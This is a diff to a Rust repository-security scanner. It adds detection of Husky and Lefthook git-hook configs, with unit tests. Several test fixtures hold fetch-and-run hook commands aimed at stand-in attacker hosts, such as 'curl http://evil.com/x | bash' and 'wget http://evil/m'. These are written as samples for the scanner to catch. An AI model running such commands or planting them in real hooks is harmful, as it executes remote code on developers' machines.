@@ -722,7 +722,337 @@ fn scan_git_hooks(root: &Path, verbose: bool) -> Vec<Finding> {
         }
     }
 
+    // 4. Check repo-tooling hook installers (Husky, Lefthook)
+    scan_repo_tooling_hooks(root, &rules, verbose, &mut findings);
+
     findings
+}
+
+// ---- Repo-tooling hooks (Husky, Lefthook) ----
+
+const HUSKY_DIR: &str = ".husky";
+
+const HUSKY_V4_CONFIG_FILES: &[&str] = &[
+    ".huskyrc",
+    ".huskyrc.json",
+    ".huskyrc.js",
+    ".huskyrc.cjs",
+    ".huskyrc.yaml",
+    ".huskyrc.yml",
+    "husky.config.js",
+    "husky.config.cjs",
+];
+
+const LEFTHOOK_CONFIG_FILES: &[&str] = &[
+    "lefthook.yml",
+    "lefthook.yaml",
+    ".lefthook.yml",
+    ".lefthook.yaml",
+    "lefthook-local.yml",
+    "lefthook-local.yaml",
+    "lefthook.json",
+    ".lefthook.json",
+    "lefthook-local.json",
+    "lefthook.toml",
+    ".lefthook.toml",
+    "lefthook-local.toml",
+];
+
+fn repo_tooling_hooks_present(root: &Path) -> bool {
+    if root.join(HUSKY_DIR).is_dir() {
+        return true;
+    }
+    for f in HUSKY_V4_CONFIG_FILES.iter().chain(LEFTHOOK_CONFIG_FILES.iter()) {
+        if root.join(f).is_file() {
+            return true;
+        }
+    }
+    if let Ok(content) = fs::read_to_string(root.join("package.json"))
+        && let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&content)
+        && pkg.get("husky").is_some()
+    {
+        return true;
+    }
+    false
+}
+
+/// Scan the `.husky/` directory used by Husky v5+. Each top-level file whose
+/// name matches a git hook is bound to that hook by `husky install`.
+fn scan_husky_dir(
+    husky_dir: &Path,
+    rules: &[PatternRule],
+    verbose: bool,
+    findings: &mut Vec<Finding>,
+) {
+    findings.push(Finding::new(
+        Severity::Medium,
+        &husky_dir.display().to_string(),
+        "Husky hooks directory '.husky/' present (installs git hooks via 'husky install')",
+    ));
+
+    for entry in WalkDir::new(husky_dir)
+        .min_depth(1)
+        .into_iter()
+        .filter_entry(|e| e.file_name() != "_") // skip husky internals (.husky/_/)
+        .filter_map(|e| e.ok())
+        .filter(|e| e.file_type().is_file())
+    {
+        let path = entry.path();
+        let name = path.file_name().unwrap_or_default().to_string_lossy();
+
+        // Skip dotfiles like .gitignore that husky drops alongside hooks
+        if name.starts_with('.') {
+            continue;
+        }
+
+        let Ok(content) = fs::read_to_string(path) else {
+            continue;
+        };
+
+        if KNOWN_GIT_HOOKS.contains(&name.as_ref()) {
+            analyze_hook_file(path, &content, rules, findings);
+        } else {
+            findings.push(Finding::new(
+                Severity::Medium,
+                &path.display().to_string(),
+                &format!(
+                    "Non-hook file '{}' in .husky/ (not auto-triggered, but still on disk)",
+                    name
+                ),
+            ));
+            analyze_file_content(path, &content, rules, findings);
+        }
+
+        if verbose {
+            println!(
+                "\n{}",
+                format!("--- Contents of {} ---", path.display()).dimmed()
+            );
+            println!("{}", content.dimmed());
+        }
+    }
+}
+
+/// Walk a `husky.hooks` mapping (Husky v4 layout) and emit per-hook findings.
+fn analyze_husky_hooks_value(
+    path: &Path,
+    val: &serde_json::Value,
+    rules: &[PatternRule],
+    findings: &mut Vec<Finding>,
+) {
+    let Some(hooks) = val.get("hooks").and_then(|h| h.as_object()) else {
+        return;
+    };
+    let file_str = path.display().to_string();
+
+    for (hook_name, cmd_val) in hooks {
+        let Some(cmd) = cmd_val.as_str() else { continue };
+        let severity = if KNOWN_GIT_HOOKS.contains(&hook_name.as_str()) {
+            Severity::High
+        } else {
+            Severity::Medium
+        };
+        findings.push(Finding::new(
+            severity,
+            &file_str,
+            &format!(
+                "Husky v4 hook '{}' command: {}",
+                hook_name,
+                truncate(cmd, 120)
+            ),
+        ));
+
+        for rule in rules {
+            if rule.pattern.is_match(cmd) {
+                findings.push(Finding::new(
+                    rule.severity.clone(),
+                    &file_str,
+                    &format!(
+                        "{} in husky '{}' hook: {}",
+                        rule.description,
+                        hook_name,
+                        truncate(cmd, 100)
+                    ),
+                ));
+            }
+        }
+    }
+}
+
+/// Scan Husky v4 RC config files (`.huskyrc`, `.huskyrc.json`, etc.).
+fn scan_husky_v4_configs(
+    root: &Path,
+    rules: &[PatternRule],
+    verbose: bool,
+    findings: &mut Vec<Finding>,
+) {
+    for name in HUSKY_V4_CONFIG_FILES {
+        let path = root.join(name);
+        if !path.is_file() {
+            continue;
+        }
+        let file_str = path.display().to_string();
+        let Ok(content) = fs::read_to_string(&path) else {
+            continue;
+        };
+
+        findings.push(Finding::new(
+            Severity::Medium,
+            &file_str,
+            &format!(
+                "Husky v4 config '{}' present (defines git hook commands)",
+                name
+            ),
+        ));
+
+        // JSON variants (.huskyrc with no extension is also JSON-formatted)
+        if (name.ends_with(".json") || *name == ".huskyrc")
+            && let Ok(val) = serde_json::from_str::<serde_json::Value>(&content)
+        {
+            analyze_husky_hooks_value(&path, &val, rules, findings);
+        }
+
+        analyze_file_content(&path, &content, rules, findings);
+
+        if verbose {
+            println!(
+                "\n{}",
+                format!("--- Contents of {} ---", path.display()).dimmed()
+            );
+            println!("{}", content.dimmed());
+        }
+    }
+}
+
+/// Scan the root `package.json` for a Husky v4 `husky.hooks` block.
+fn scan_husky_in_package_json(
+    root: &Path,
+    rules: &[PatternRule],
+    findings: &mut Vec<Finding>,
+) {
+    let pkg_path = root.join("package.json");
+    let Ok(content) = fs::read_to_string(&pkg_path) else {
+        return;
+    };
+    let Ok(pkg) = serde_json::from_str::<serde_json::Value>(&content) else {
+        return;
+    };
+    let Some(husky) = pkg.get("husky") else { return };
+
+    findings.push(Finding::new(
+        Severity::Medium,
+        &pkg_path.display().to_string(),
+        "package.json declares 'husky' configuration block (defines git hooks)",
+    ));
+    analyze_husky_hooks_value(&pkg_path, husky, rules, findings);
+}
+
+/// Scan Lefthook config files in the repo root.
+fn scan_lefthook_configs(
+    root: &Path,
+    rules: &[PatternRule],
+    verbose: bool,
+    findings: &mut Vec<Finding>,
+) {
+    let Ok(hook_name_re) = Regex::new(r"(?m)^([A-Za-z][A-Za-z0-9_-]*):\s*$") else {
+        return;
+    };
+    let Ok(yaml_run_re) =
+        Regex::new(r#"(?m)^\s*run:\s*(?:[|>][-+]?\s*)?(.+?)\s*$"#)
+    else {
+        return;
+    };
+    let Ok(toml_run_re) =
+        Regex::new(r#"(?m)^\s*run\s*=\s*['"](.+?)['"]\s*$"#)
+    else {
+        return;
+    };
+    let Ok(json_run_re) = Regex::new(r#""run"\s*:\s*"((?:[^"\\]|\\.)*)""#) else {
+        return;
+    };
+
+    for name in LEFTHOOK_CONFIG_FILES {
+        let path = root.join(name);
+        if !path.is_file() {
+            continue;
+        }
+        let file_str = path.display().to_string();
+        let Ok(content) = fs::read_to_string(&path) else {
+            continue;
+        };
+
+        findings.push(Finding::new(
+            Severity::Medium,
+            &file_str,
+            &format!(
+                "Lefthook config '{}' present (defines git hooks via 'lefthook install')",
+                name
+            ),
+        ));
+
+        // Top-level keys matching git hook names = hooks defined by this config
+        for cap in hook_name_re.captures_iter(&content) {
+            let key = &cap[1];
+            if KNOWN_GIT_HOOKS.contains(&key) {
+                findings.push(Finding::new(
+                    Severity::High,
+                    &file_str,
+                    &format!(
+                        "Lefthook defines '{}' hook (runs automatically on git operations)",
+                        key
+                    ),
+                ));
+            }
+        }
+
+        // Surface each `run:` command — the actual shell snippet executed
+        let collect = |re: &Regex| -> Vec<String> {
+            re.captures_iter(&content)
+                .map(|c| c[1].to_string())
+                .collect()
+        };
+        let mut commands: Vec<String> = if name.ends_with(".json") {
+            collect(&json_run_re)
+        } else if name.ends_with(".toml") {
+            collect(&toml_run_re)
+        } else {
+            collect(&yaml_run_re)
+        };
+        commands.dedup();
+        for cmd in commands {
+            findings.push(Finding::new(
+                Severity::Medium,
+                &file_str,
+                &format!("Lefthook command: {}", truncate(cmd.trim(), 120)),
+            ));
+        }
+
+        // Catch inline curl, base64 decode, /dev/tcp, etc. anywhere in the file
+        analyze_file_content(&path, &content, rules, findings);
+
+        if verbose {
+            println!(
+                "\n{}",
+                format!("--- Contents of {} ---", path.display()).dimmed()
+            );
+            println!("{}", content.dimmed());
+        }
+    }
+}
+
+fn scan_repo_tooling_hooks(
+    root: &Path,
+    rules: &[PatternRule],
+    verbose: bool,
+    findings: &mut Vec<Finding>,
+) {
+    let husky_dir = root.join(HUSKY_DIR);
+    if husky_dir.is_dir() {
+        scan_husky_dir(&husky_dir, rules, verbose, findings);
+    }
+    scan_husky_v4_configs(root, rules, verbose, findings);
+    scan_husky_in_package_json(root, rules, findings);
+    scan_lefthook_configs(root, rules, verbose, findings);
 }
 
 fn scan_vscode_dir(vscode_dir: &Path, verbose: bool) -> Vec<Finding> {
@@ -2653,6 +2983,7 @@ fn main() {
             || dir.join(".githooks").is_dir()
             || dir.join(".hooks").is_dir()
             || dir.join("githooks").is_dir()
+            || repo_tooling_hooks_present(dir)
     };
 
     let mut git_roots: Vec<PathBuf> = Vec::new();
@@ -2673,7 +3004,7 @@ fn main() {
     for git_root in &git_roots {
         scanned_anything = true;
         println!(
-            "\n{} {} (git hooks)",
+            "\n{} {} (git hooks, husky, lefthook)",
             "Scanning:".bold(),
             git_root.display()
         );
@@ -3536,6 +3867,184 @@ mod tests {
             "Expected at least 3 critical findings, got {}",
             critical_count
         );
+    }
+
+    // ---- Husky / Lefthook tests ----
+
+    #[test]
+    fn husky_pre_commit_in_dot_husky_is_high() {
+        let dir = tempfile::tempdir().unwrap();
+        let husky = dir.path().join(".husky");
+        fs::create_dir_all(&husky).unwrap();
+        fs::write(husky.join("pre-commit"), "#!/bin/sh\nnpm test").unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(has_description_containing(
+            &findings,
+            "Husky hooks directory '.husky/' present"
+        ));
+        assert!(has_description_containing(
+            &findings,
+            "runs automatically on common git operations"
+        ));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn husky_internals_underscore_dir_is_ignored() {
+        let dir = tempfile::tempdir().unwrap();
+        let internals = dir.path().join(".husky").join("_");
+        fs::create_dir_all(&internals).unwrap();
+        fs::write(internals.join("husky.sh"), "#!/bin/sh\necho husky internal").unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(
+            !has_description_containing(&findings, "husky.sh"),
+            "Files under .husky/_/ should be skipped"
+        );
+    }
+
+    #[test]
+    fn husky_pre_push_with_curl_is_critical() {
+        let dir = tempfile::tempdir().unwrap();
+        let husky = dir.path().join(".husky");
+        fs::create_dir_all(&husky).unwrap();
+        fs::write(
+            husky.join("pre-push"),
+            "#!/bin/sh\ncurl http://evil.com/x | bash",
+        )
+        .unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(has_description_containing(
+            &findings,
+            "Network download command"
+        ));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn husky_non_hook_file_is_medium_but_content_scanned() {
+        let dir = tempfile::tempdir().unwrap();
+        let husky = dir.path().join(".husky");
+        fs::create_dir_all(&husky).unwrap();
+        fs::write(
+            husky.join("install.mjs"),
+            "// husky v9 installer\ncurl http://evil/x | bash",
+        )
+        .unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(has_description_containing(
+            &findings,
+            "Non-hook file 'install.mjs' in .husky/"
+        ));
+        assert!(has_description_containing(
+            &findings,
+            "Network download command"
+        ));
+    }
+
+    #[test]
+    fn husky_v4_huskyrc_json_with_malicious_hook() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::write(
+            dir.path().join(".huskyrc.json"),
+            r#"{"hooks":{"pre-commit":"curl http://evil.com/x | bash"}}"#,
+        )
+        .unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(has_description_containing(&findings, "Husky v4 config"));
+        assert!(has_description_containing(
+            &findings,
+            "Husky v4 hook 'pre-commit'"
+        ));
+        assert!(has_description_containing(
+            &findings,
+            "in husky 'pre-commit' hook"
+        ));
+    }
+
+    #[test]
+    fn husky_block_in_package_json_is_flagged() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::write(
+            dir.path().join("package.json"),
+            r#"{"name":"x","husky":{"hooks":{"pre-push":"wget http://evil/m"}}}"#,
+        )
+        .unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(has_description_containing(
+            &findings,
+            "package.json declares 'husky'"
+        ));
+        assert!(has_description_containing(
+            &findings,
+            "Husky v4 hook 'pre-push'"
+        ));
+    }
+
+    #[test]
+    fn lefthook_yaml_lists_defined_hooks_and_commands() {
+        let dir = tempfile::tempdir().unwrap();
+        let yaml = "pre-commit:\n  commands:\n    lint:\n      run: eslint .\npre-push:\n  commands:\n    test:\n      run: npm test\n";
+        fs::write(dir.path().join("lefthook.yml"), yaml).unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(has_description_containing(&findings, "Lefthook config"));
+        assert!(has_description_containing(
+            &findings,
+            "Lefthook defines 'pre-commit'"
+        ));
+        assert!(has_description_containing(
+            &findings,
+            "Lefthook defines 'pre-push'"
+        ));
+        assert!(has_description_containing(&findings, "Lefthook command:"));
+    }
+
+    #[test]
+    fn lefthook_yaml_with_curl_is_critical() {
+        let dir = tempfile::tempdir().unwrap();
+        let yaml = "pre-commit:\n  commands:\n    payload:\n      run: curl http://evil.com/x | bash\n";
+        fs::write(dir.path().join("lefthook.yml"), yaml).unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(has_description_containing(
+            &findings,
+            "Network download command"
+        ));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn lefthook_json_extracts_run_commands() {
+        let dir = tempfile::tempdir().unwrap();
+        let json =
+            r#"{"pre-commit":{"commands":{"x":{"run":"wget http://evil/m -O /tmp/m"}}}}"#;
+        fs::write(dir.path().join("lefthook.json"), json).unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(has_description_containing(&findings, "Lefthook config"));
+        assert!(has_description_containing(&findings, "Lefthook command:"));
+    }
+
+    #[test]
+    fn lefthook_local_override_is_flagged() {
+        let dir = tempfile::tempdir().unwrap();
+        fs::write(
+            dir.path().join("lefthook-local.yml"),
+            "pre-commit:\n  commands:\n    a:\n      run: echo local\n",
+        )
+        .unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(has_description_containing(
+            &findings,
+            "Lefthook config 'lefthook-local.yml'"
+        ));
+    }
+
+    #[test]
+    fn lefthook_toml_extracts_run_commands() {
+        let dir = tempfile::tempdir().unwrap();
+        let toml = "[pre-commit.commands.lint]\nrun = \"eslint .\"\n";
+        fs::write(dir.path().join("lefthook.toml"), toml).unwrap();
+        let findings = scan_git_hooks(dir.path(), false);
+        assert!(has_description_containing(&findings, "Lefthook config"));
+        assert!(has_description_containing(&findings, "Lefthook command:"));
     }
 
     // ---- Cargo build script helpers ----
